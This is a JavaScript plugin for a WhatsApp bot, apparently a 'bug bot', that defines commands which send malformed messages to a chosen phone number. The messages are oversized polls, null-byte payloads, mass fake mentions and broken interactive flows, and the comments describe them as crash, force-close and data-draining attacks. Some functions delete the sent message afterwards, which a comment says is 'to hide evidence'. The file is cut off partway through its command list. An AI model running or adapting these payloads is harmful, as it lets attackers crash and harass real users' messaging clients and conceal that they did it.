const { cmd } = require('../command');
const crypto = require('crypto');
let { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
if (!generateWAMessageFromContent) {
    try { generateWAMessageFromContent = require('@adiwajshing/baileys').generateWAMessageFromContent; } catch(e) {}
}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Helper: validate and format target number
function getTarget(args, from, reply, cmdName) {
    if (!args || !args[0]) {
        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX\nExample: .${cmdName} 94712345678`);
        return null;
    }
    return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
}

// ==================== ORIGINAL CRASH FUNCTIONS (already working) ====================
async function xlmnop(conn, target) {
    const pollMsg = {
        pollCreationMessage: {
            name: "⚠️ SYSTEM OVERFLOW ⚠️" + "0".repeat(20000),
            options: [
                { optionName: "⛔" + "0".repeat(50000) },
                { optionName: "💀" + "0".repeat(50000) }
            ],
            selectableOptionsCount: 1,
            pollType: "QUIZ",
            correctAnswer: { optionName: "💀" + "0".repeat(50000) },
            contextInfo: { isGroupStatus: false }
        }
    };
    const msg = generateWAMessageFromContent(target, pollMsg, {});
    await conn.relayMessage(target, msg.message, {});
}

async function ttaas(conn, target) {
    const imageMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
        fileLength: "93217",
        caption: "7eppsynC",
        height: 1080,
        width: 1080,
        mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
        fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
        directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1778142659",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIxISIyQWL/2gAMAwEAAhEDEQA/AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
        contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA", isQuestion: true, isGroupStatus: true },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        firstScanLength: 9999999999999999999,
        scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
        midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
    };
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                productMessage: {
                    product: {
                        productImage: imageMessage,
                        productId: "449756950375071",
                        title: "7eppsynC",
                        description: "",
                        priceAmount1000: { low: 999, high: 0, unsigned: false },
                        url: "wa.me/status",
                        productImageCount: 9999999,
                        firstImageId: "9999999999",
                        salePriceAmount1000: { low: 9999999, high: 999999999, unsigned: true }
                    },
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

async function callinvisible(conn, target) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "@rizxvelzdev", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                },
                contextInfo: {
                    participant: { jid: target },
                    mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
                    ]
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

async function DelayInvisibleXx(conn, target) {
    const mentioned = Array.from({ length: 10 }, () => "0@s.whatsapp.net");
    const invisibleChar = '\u2063';
    const longText = invisibleChar.repeat(500000) + "@0".repeat(50000);
    const payload = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: { locationMessage: { degreesLatitude: 9999, degreesLongitude: 9999 }, hasMediaAttachment: true },
                    body: { text: longText },
                    nativeFlowMessage: {},
                    contextInfo: { mentionedJid: mentioned }
                },
                groupStatusMentionMessage: {
                    groupJid: target,
                    mentionedJid: mentioned,
                    contextInfo: { mentionedJid: mentioned }
                }
            }
        }
    };
    await conn.relayMessage(target, payload, { participant: { jid: target } });
}

async function delay2(conn, target) {
    const mentionedJid = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
    ];
    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Amelia Modders",
                    listType: 2,
                    sections: [],
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Amelia Modders"
                }
            }
        }
    };
    const msg = generateWAMessageFromContent(target, MSG, {});
    await conn.relayMessage(target, msg.message, {});
}

async function AmeliaBeta(conn, target) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
    ];
    const interactiveMsg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "Amelia Send Delay", format: "DEFAULT" },
                    nativeFlowResponseMessage: { name: "call_permission_request", paramsJson: "\x10".repeat(1045000), version: 3 },
                    entryPointConversionSource: "galaxy_message"
                }
            }
        }
    }, { ephemeralExpiration: 0, forwardingScore: 9741, isForwarded: true });
    await conn.relayMessage(target, interactiveMsg.message, {});
    await sleep(500);
    const stickerMsg = {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                    mimetype: "image/webp",
                    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                    fileLength: { low: 1, high: 0, unsigned: true },
                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                    firstFrameLength: 19904,
                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                    isAnimated: true,
                    contextInfo: { mentionedJid: ["13135550002@s.whatsapp.net"] },
                    stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
                    isAvatar: true,
                    isAiSticker: true,
                    isLottie: true
                }
            }
        }
    };
    const sticker = generateWAMessageFromContent(target, stickerMsg, {});
    await conn.relayMessage(target, sticker.message, {});
}

async function BlankVVIP(conn, target) {
    const MSG = {
        groupInviteMessage: {
            groupJid: "120363370626418572@g.us",
            inviteCode: "Xx".repeat(10000),
            inviteExpiration: "99999999999",
            groupName: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌" + "ោ៝".repeat(77777),
            caption: "ោ៝".repeat(10000) + "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000) + "._.*_*._>".repeat(5000),
            contentText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000),
            displayText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000),
            contextInfo: {
                expiration: 1,
                ephemeralSettingTimestamp: 1,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 1,
                disappearingMode: { initiatorDeviceJid: target, initiator: "INITIATED_BY_OTHER", trigger: "UNKNOWN_GROUPS" },
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: "0@s.whatsapp.net",
                questionMessage: { paymentInviteMessage: { serviceType: 1, expiryTimestamp: null } },
                externalAdReply: { showAdAttribution: false, renderLargerThumbnail: true }
            },
            body: { text: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌" + "ោ៝".repeat(10450) + "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(32901) + "@1".repeat(50000) },
            footer: { text: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(5000) },
            nativeFlowMessage: { messageParamJson: "{".repeat(25000) },
            buttons: [
                { name: "cta_url", buttonParamJson: "\u0000".repeat(25000) },
                { name: "cta_url", buttonParamJson: JSON.stringify({ displayText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000) }) },
                { name: "cta_call", buttonParamJson: JSON.stringify({ displayText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(5000) }) },
                { name: "cta_copy", buttonParamJson: "\u0000".repeat(25000) }
            ]
        }
    };
    await conn.relayMessage(target, MSG, { participant: { jid: target } });
}

// ==================== NEW FUNCTIONS (INTEGRATED & FIXED) ====================

// 1. Dark - Sedot kuota (image + massive payload)
async function Dark(conn, target) {
    const payload = "\u0000".repeat(2097152); // 2MB null bytes
    const mentionList = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
    ];
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://iili.io/FvogpYG.jpg",
                    mimetype: "image/jpeg",
                    caption: "Amelia Kill You",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: mentionList,
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                },
                nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: payload
                }
            }
        }
    };
    const msg = generateWAMessageFromContent(target, generateMessage, {});
    await conn.relayMessage(target, msg.message, {});
}

// 2. LocaX - Invisible nguras kuota (location spam)
async function LocaX(conn, target) {
    const generateLocationMessage = {
        viewOnceMessage: {
            message: {
                locationMessage: {
                    degreesLatitude: 0,
                    degreesLongitude: 0,
                    name: "sockzX7",
                    address: "\u0000",
                    contextInfo: {
                        mentionedJid: [
                            target,
                            ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                        ],
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };
    const msg = generateWAMessageFromContent(target, generateLocationMessage, {});
    await conn.relayMessage(target, msg.message, {});
}

// 3. FcUiFlows - Interactive flow with many buttons
async function FcUiFlows(conn, target) {
    const mentionedJidList = [
        target,
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
    ];
    const Params = "{[(".repeat(20000);
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: { title: "", hasMediaAttachment: false },
                    body: { text: "</𖥂 gw Ganteng\\>" },
                    nativeFlowMessage: {
                        messageParamsJson: Params,
                        buttons: [
                            { name: "single_select", buttonParamsJson: JSON.stringify({ status: true }) },
                            { name: "call_permission_request", buttonParamsJson: JSON.stringify({ status: true }) },
                            { name: "send_location", buttonParamsJson: "{}" },
                            { name: "payment_method", buttonParamsJson: "" },
                            { name: "form_message", buttonParamsJson: "" },
                            { name: "catalog_message", buttonParamsJson: "" },
                            { name: "review_and_pay", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" }
                        ]
                    },
                    contextInfo: {
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        forwardingScore: 250208,
                        isForwarded: false,
                        mentionedJid: mentionedJidList
                    }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
    await sleep(100);
    // optional: delete the message after a short time to hide evidence
    try { await conn.sendMessage(target, { delete: msg.key }); } catch(e) {}
}

// 4. LocXz - Lock invisible (interactive + extended text)
async function LocXz(conn, target) {
    const extendedTextMessage = {
        extendedTextMessage: {
            text: "P",
            matchedText: "P",
            description: "饝噦饝喌饝喆饝喛".repeat(50000),
            title: "p" + "饝噦饝喌饝喆饝喛".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "oZHMQSYL3hcdbYuoNcAzOgCOF+qzz7J5RvgMY3cWaVc=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 1024,
            thumbnailWidth: 1024,
            inviteLinkGroupTypeV2: "DEFAULT"
        }
    };
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: extendedTextMessage }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

// 5. SpcmCrash2 - Force close via malformed interactive message
async function SpcmCrash2(conn, target) {
    const maklo = JSON.stringify({
        status: true, criador: "Ganz — DΣV", sessionName: "./sessions/maklo", isConnected: true,
        uptime: 10240, bugMethod: "sql_injection", resultado: { type: "md", ws: { _eventsCount: 500000, url: "wss://web.whatsapp.com/ws/chat" } }
    });
    const sections = [];
    for (let i = 0; i < 25; i++) {
        sections.push({
            title: "Ganz",
            highlight_label: `Ngewe ${i}×`,
            rows: [
                {
                    title: "Ganz",
                    id: `id${i}`,
                    subrows: [
                        { title: "Ganz", id: `/${i}`, subsubrows: [{ title: "Ganz", id: `/${i}` }, { title: "Ganz.", id: `/${i}` }] },
                        { title: "Ganz Alwayss !", id: `/${i}` }
                    ]
                }
            ]
        });
    }
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: [target, "13135550002@s.whatsapp.net"],
                        isForwarded: true, forwardingScore: 999,
                        businessMessageForwardInfo: { businessOwnerJid: "13135550002@s.whatsapp.net" },
                        participant: "0@s.whatsapp.net", remoteJid: "status@broadcast"
                    },
                    body: { text: "Ganzz Alwayss!" },
                    footer: { buttonParamsJson: "{[".repeat(9000) },
                    header: { buttonParamsJson: "]}".repeat(9000), subtitle: "Ganzz Alwayss !", hasMediaAttachment: false },
                    nativeFlowMessage: {
                        messageParamsJson: "{[".repeat(9000),
                        buttons: [
                            { name: "single_select", buttonParamsJson: maklo },
                            { name: "call_permission_request", buttonParamsJson: maklo },
                            { name: "call_permission_request", buttonParamsJson: maklo },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" }
                        ]
                    }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, { participant: { jid: target } });
    await sleep(100);
    try { await conn.sendMessage(target, { delete: msg.key }); } catch(e) {}
}

// 6. CarouselVY - Carousel spam with many cards
async function CarouselVY(conn, target) {
    const memec = "ꦾ".repeat(9999);
    const invisible = "\u2060".repeat(3000);
    const img = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQO8fP6AIG1EcRNZZeBhFHdFgya8amkM1RUkSkPuUqRnE6cpnmqQ8oJXJof_8XkOdzuXXwfDTSbHUnyT0fxQiElWsTJhBxzMz2LrYQqS4Q?ccb=9-4&oh=01_Q5Aa2AHm-OtLbKQy0rfnIKTfL0QsHqMpN_lMWdPwjUMhhLYMSw&oe=68AD3977&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "CrP44RkJbl+shQQxxlJ6s0SAAcOWqWgxw3iEiGi3zZI=",
        fileLength: "59668",
        height: 736,
        width: 736,
        mediaKey: "YRUaXE2466bqWOmhGwPxA6bC3Qif2tTFmsJ/Q+49ijc=",
        fileEncSha256: "rTAiyS+goq3w37k70/mwSiCVRUFjD66uanaabunAG8w=",
        directPath: "/o1/v/t24/f2/m269/AQO8fP6AIG1EcRNZZeBhFHdFgya8amkM1RUkSkPuUqRnE6cpnmqQ8oJXJof_8XkOdzuXXwfDTSbHUnyT0fxQiElWsTJhBxzMz2LrYQqS4Q?ccb=9-4&oh=01_Q5Aa2AHm-OtLbKQy0rfnIKTfL0QsHqMpN_lMWdPwjUMhhLYMSw&oe=68AD3977&_nc_sid=e6ed6c",
        mediaKeyTimestamp: "1753601096",
        jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD...", "base64")
    };
    const basePayload = { header: "ϟ", body: "Ganz", flow_action: "Salvadores", flow_action_payload: { screen: "Soviet" }, flow_cta: "1", flow_id: "1", flow_message_version: "1", flow_token: "1" };
    const cards = [];
    for (let i = 0; i < 200; i++) { // reduced from 3000 to avoid timeout, but still powerful
        cards.push({
            header: { hasMediaAttachment: true, imageMessage: img, title: invisible + "꧔꧈" + i },
            body: { text: memec },
            footer: { text: "꧔꧈" + i },
            nativeFlowMessage: {
                buttons: [
                    { name: "galaxy_message", buttonParamsJson: JSON.stringify({ ...basePayload, flow_cta: "{", flow_id: "1", flow_token: "{[" }) },
                    { name: "galaxy_message", buttonParamsJson: JSON.stringify({ ...basePayload, flow_cta: "{{", flow_id: "{[" }) }
                ]
            }
        });
    }
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                interactiveMessage: {
                    body: { text: memec },
                    footer: { text: "Ganz" },
                    header: { hasMediaAttachment: true, imageMessage: img },
                    carouselMessage: { cards }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

// ==================== COMMANDS ====================
const commands = [
    { name: "pollbug", func: xlmnop, desc: "Poll overflow crash" },
    { name: "bug", func: ttaas, desc: "ViewOnce product crash (original)" },
    { name: "callinv", func: callinvisible, desc: "Call permission crash" },
    { name: "delayx", func: DelayInvisibleXx, desc: "Invisible delay crash" },
    { name: "delay2", func: delay2, desc: "List response crash" },
    { name: "ameliabeta", func: AmeliaBeta, desc: "Video+sticker combo crash" },
